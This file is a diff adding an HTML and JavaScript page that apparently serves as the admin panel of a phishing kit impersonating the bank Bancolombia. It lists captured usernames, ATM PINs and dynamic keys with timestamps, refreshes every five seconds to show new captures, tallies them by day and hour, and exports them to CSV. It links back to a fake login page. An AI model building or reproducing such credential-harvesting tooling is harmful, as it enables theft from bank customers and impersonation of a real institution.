@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Bancolombia — Datos Recolectados</title>
+    <style>
+        :root {
+            --bg: #1f1f1f;
+            --card: #2b2b2b;
+            --panel: #3a3a3a;
+            --muted: #a9a9a9;
+            --text: #eaeaea;
+            --primary: #f6c000;
+            --secondary: #ff7a3d;
+            --tertiary: #7c5cff;
+            --success: #2dd4bf;
+            --accent: #6ee7e7;
+            --danger: #ef4444;
+            --shadow: 0 10px 30px rgba(0, 0, 0, .45);
+            --radius: 14px;
+        }
+
+        * {
+            box-sizing: border-box
+        }
+
+        html,
+        body {
+            min-height: 100vh;
+        }
+
+        body {
+            margin: 0;
+            background: var(--bg);
+            color: var(--text);
+            font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, Helvetica, Arial;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 0;
+        }
+
+        .wrap {
+            width: min(1200px, 95vw);
+            position: relative;
+        }
+
+        .curves {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .curve {
+            position: absolute;
+            width: 1200px;
+            height: 1200px;
+            opacity: .3;
+            filter: drop-shadow(0 2px 0 rgba(0, 0, 0, .05));
+        }
+
+        .curve path {
+            fill: none;
+            stroke-linecap: round;
+            stroke-width: 26
+        }
+
+        .curve.yellow path {
+            stroke: var(--primary)
+        }
+
+        .curve.orange path {
+            stroke: var(--secondary)
+        }
+
+        .curve.purple path {
+            stroke: var(--tertiary)
+        }
+
+        .curve.tilt-left {
+            left: -200px;
+            top: 40%;
+            transform: rotate(-18deg)
+        }
+
+        .curve.tilt-right {
+            right: -220px;
+            top: -8%;
+            transform: rotate(24deg)
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+            position: relative;
+            z-index: 2
+        }
+
+        .logo {
+            font-weight: 800;
+            letter-spacing: .2px;
+            display: inline-flex;
+            align-items: center;
+            gap: .6rem;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .logo:hover {
+            transform: scale(1.05);
+        }
+
+        .logo-img {
+            width: 50px;
+            height: auto;
+            cursor: pointer;
+        }
+
+        .title {
+            font-size: clamp(1.3rem, 2.4vw, 1.9rem);
+            margin-top: 6px;
+            color: #fff;
+            opacity: .92
+        }
+
+        .card {
+            background: var(--card);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            padding: 30px;
+            position: relative;
+            z-index: 2;
+            overflow-x: auto;
+        }
+
+        .card h2 {
+            margin: 0 0 10px;
+            font-size: 1.5rem;
+            color: var(--accent);
+        }
+
+        .card p.sub {
+            margin: 0 0 25px;
+            color: var(--muted)
+        }
+
+        .stats {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+
+        .stat-item {
+            background: var(--panel);
+            padding: 15px 20px;
+            border-radius: 12px;
+            flex: 1;
+            min-width: 150px;
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 2rem;
+            font-weight: bold;
+            color: var(--accent);
+            display: block;
+        }
+
+        .stat-label {
+            color: var(--muted);
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, .2);
+        }
+
+        .data-table th,
+        .data-table td {
+            padding: 15px;
+            text-align: left;
+            border-bottom: 1px solid #444;
+        }
+
+        .data-table th {
+            background: var(--panel);
+            font-weight: 600;
+            color: var(--accent);
+            font-size: 0.95rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .data-table td {
+            background: rgba(255, 255, 255, 0.02);
+            transition: background-color 0.2s ease;
+        }
+
+        .data-table tr:hover td {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .data-table tr:last-child td {
+            border-bottom: none;
+        }
+
+        .clave-field {
+            font-family: monospace;
+            background: var(--panel);
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+        }
+
+        .dinamica-field {
+            font-family: monospace;
+            background: linear-gradient(135deg, var(--accent) 0%, var(--tertiary) 100%);
+            color: #000;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+
+        .empty-state {
+            text-align: center;
+            color: var(--muted);
+            padding: 60px;
+            font-style: italic;
+        }
+
+        .empty-icon {
+            font-size: 4rem;
+            opacity: 0.3;
+            margin-bottom: 15px;
+        }
+
+        .actions-bar {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border-radius: 8px;
+            border: 0;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 0.9rem;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn.primary {
+            background: var(--accent);
+            color: #000;
+        }
+
+        .btn.primary:hover {
+            background: #5dd5d5;
+            transform: translateY(-1px);
+        }
+
+        .btn.danger {
+            background: var(--danger);
+            color: #fff;
+        }
+
+        .btn.danger:hover {
+            background: #dc2626;
+            transform: translateY(-1px);
+        }
+
+        .btn.secondary {
+            background: var(--panel);
+            color: var(--text);
+            border: 1px solid #555;
+        }
+
+        .btn.secondary:hover {
+            background: #404040;
+        }
+
+        .search-box {
+            background: var(--panel);
+            border: 1px solid #555;
+            border-radius: 8px;
+            padding: 8px 12px;
+            color: var(--text);
+            font-size: 0.9rem;
+            width: 250px;
+        }
+
+        .search-box:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 2px rgba(110, 231, 231, 0.2);
+        }
+
+        footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #9a9a9a;
+            font-size: .85rem
+        }
+
+        footer a {
+            color: #c9c9c9
+        }
+
+        @media (max-width: 768px) {
+            .wrap {
+                width: 98vw;
+            }
+
+            .card {
+                padding: 20px;
+            }
+
+            .stats {
+                flex-direction: column;
+            }
+
+            .data-table {
+                font-size: 0.85rem;
+            }
+
+            .data-table th,
+            .data-table td {
+                padding: 10px 8px;
+            }
+
+            .actions-bar {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .search-box {
+                width: 100%;
+            }
+        }
+
+        .index-col {
+            width: 60px;
+            text-align: center;
+            font-weight: bold;
+            color: var(--muted);
+        }
+
+        .timestamp-col {
+            white-space: nowrap;
+            font-size: 0.85rem;
+            color: var(--muted);
+        }
+    </style>
+</head>
+
+<body>
+
+    <main class="wrap">
+        <header>
+            <div class="logo" aria-label="Bancolombia" id="logoBackBtn">
+                <img src="./bancolombia-logo.png" alt="Logo Bancolombia" class="logo-img">
+                <span>Bancolombia</span>
+            </div>
+            <div class="title">Datos Recolectados</div>
+        </header>
+
+        <section class="card">
+            <p class="sub">Información capturada del sistema de login y verificación</p>
+
+            <!-- Estadísticas -->
+            <div class="stats" id="statsContainer">
+                <div class="stat-item">
+                    <span class="stat-number" id="totalUsers">0</span>
+                    <div class="stat-label">Total Registros</div>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number" id="todayUsers">0</span>
+                    <div class="stat-label">Hoy</div>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number" id="lastHourUsers">0</span>
+                    <div class="stat-label">Última Hora</div>
+                </div>
+            </div>
+
+            <!-- Barra de acciones -->
+            <div class="actions-bar">
+                <div style="display: flex; gap: 15px; flex-wrap: wrap;">
+                    <a href="index.html" class="btn secondary">
+                        ← Volver al Login
+                    </a>
+                    <button class="btn danger" id="clearDataBtn">
+                        🗑️ Limpiar Datos
+                    </button>
+                    <button class="btn primary" id="exportBtn">
+                        📥 Exportar CSV
+                    </button>
+                </div>
+                <input type="text" class="search-box" id="searchBox" placeholder="Buscar por usuario...">
+            </div>
+
+            <!-- Contenedor de datos -->
+            <div id="dataContainer">
+                <div class="empty-state">
+                    <div class="empty-icon">📝</div>
+                    <div>No hay datos disponibles</div>
+                    <small style="margin-top: 10px; display: block;">Los datos aparecerán aquí cuando los usuarios
+                        completen el proceso de autenticación</small>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            © <span id="year">2024</span> Bancolombia
+        </footer>
+    </main>
+
+    <script>
+        // Variables globales
+        let userData = JSON.parse(localStorage.getItem('bancolombiaData') || '[]');
+        let filteredData = [...userData];
+
+        // Elementos DOM
+        const logoBackBtn = document.getElementById('logoBackBtn');
+        const dataContainer = document.getElementById('dataContainer');
+        const clearDataBtn = document.getElementById('clearDataBtn');
+        const exportBtn = document.getElementById('exportBtn');
+        const searchBox = document.getElementById('searchBox');
+        const totalUsersSpan = document.getElementById('totalUsers');
+        const todayUsersSpan = document.getElementById('todayUsers');
+        const lastHourUsersSpan = document.getElementById('lastHourUsers');
+
+        // Funciones de estadísticas
+        function updateStats() {
+            const now = new Date();
+            const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+            const oneHourAgo = new Date(now.getTime() - 60 * 60 * 1000);
+
+            const todayCount = userData.filter(user => {
+                const userDate = new Date(user.timestamp.split(', ')[0].split('/').reverse().join('-'));
+                return userDate >= today;
+            }).length;
+
+            const lastHourCount = userData.filter(user => {
+                const userDateTime = new Date(user.timestamp.split(', ')[0].split('/').reverse().join('-') + ' ' + user.timestamp.split(', ')[1]);
+                return userDateTime >= oneHourAgo;
+            }).length;
+
+            totalUsersSpan.textContent = userData.length;
+            todayUsersSpan.textContent = todayCount;
+            lastHourUsersSpan.textContent = lastHourCount;
+        }
+
+        // Función para renderizar la tabla
+        function renderDataTable() {
+            if (filteredData.length === 0) {
+                dataContainer.innerHTML = `
+                    <div class="empty-state">
+                        <div class="empty-icon">📝</div>
+                        <div>${userData.length === 0 ? 'No hay datos disponibles' : 'No se encontraron resultados'}</div>
+                        <small style="margin-top: 10px; display: block;">
+                            ${userData.length === 0 ? 'Los datos aparecerán aquí cuando los usuarios completen el proceso de autenticación' : 'Intenta con otro término de búsqueda'}
+                        </small>
+                    </div>
+                `;
+                return;
+            }
+
+            const table = `
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th class="index-col">#</th>
+                            <th>Usuario</th>
+                            <th>Clave Cajero</th>
+                            <th>Clave Dinámica</th>
+                            <th class="timestamp-col">Fecha/Hora</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${filteredData.map((user, index) => `
+                            <tr>
+                                <td class="index-col">${userData.indexOf(user) + 1}</td>
+                                <td><strong>${user.usuario}</strong></td>
+                                <td><span class="clave-field">${user.clave}</span></td>
+                                <td><span class="dinamica-field">${user.claveDinamica}</span></td>
+                                <td class="timestamp-col">${user.timestamp}</td>
+                            </tr>
+                        `).join('')}
+                    </tbody>
+                </table>
+            `;
+
+            dataContainer.innerHTML = table;
+        }
+
+        // Función de búsqueda
+        function filterData(searchTerm) {
+            filteredData = userData.filter(user =>
+                user.usuario.toLowerCase().includes(searchTerm.toLowerCase())
+            );
+            renderDataTable();
+        }
+
+        // Función para exportar CSV
+        function exportToCSV() {
+            if (userData.length === 0) {
+                alert('No hay datos para exportar');
+                return;
+            }
+
+            const headers = ['#', 'Usuario', 'Clave Cajero', 'Clave Dinámica', 'Fecha/Hora'];
+            const csvData = [
+                headers.join(','),
+                ...userData.map((user, index) => [
+                    index + 1,
+                    `"${user.usuario}"`,
+                    `"${user.clave}"`,
+                    `"${user.claveDinamica}"`,
+                    `"${user.timestamp}"`
+                ].join(','))
+            ].join('\n');
+
+            const blob = new Blob([csvData], { type: 'text/csv' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `bancolombia_datos_${new Date().toISOString().split('T')[0]}.csv`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+        }
+
+        // Event listeners
+        logoBackBtn.addEventListener('click', () => {
+            window.location.href = 'index.html';
+        });
+
+        clearDataBtn.addEventListener('click', () => {
+            if (confirm('¿Estás seguro de que quieres eliminar todos los datos? Esta acción no se puede deshacer.')) {
+                localStorage.removeItem('bancolombiaData');
+                userData = [];
+                filteredData = [];
+                renderDataTable();
+                updateStats();
+            }
+        });
+
+        exportBtn.addEventListener('click', exportToCSV);
+
+        searchBox.addEventListener('input', (e) => {
+            filterData(e.target.value);
+        });
+
+        // Actualizar datos cada 5 segundos
+        setInterval(() => {
+            const newData = JSON.parse(localStorage.getItem('bancolombiaData') || '[]');
+            if (newData.length !== userData.length) {
+                userData = newData;
+                filterData(searchBox.value);
+                updateStats();
+            }
+        }, 5000);
+
+        // Inicialización
+        document.getElementById('year').textContent = new Date().getFullYear();
+        renderDataTable();
+        updateStats();
+    </script>
+</body>
+
+</html>
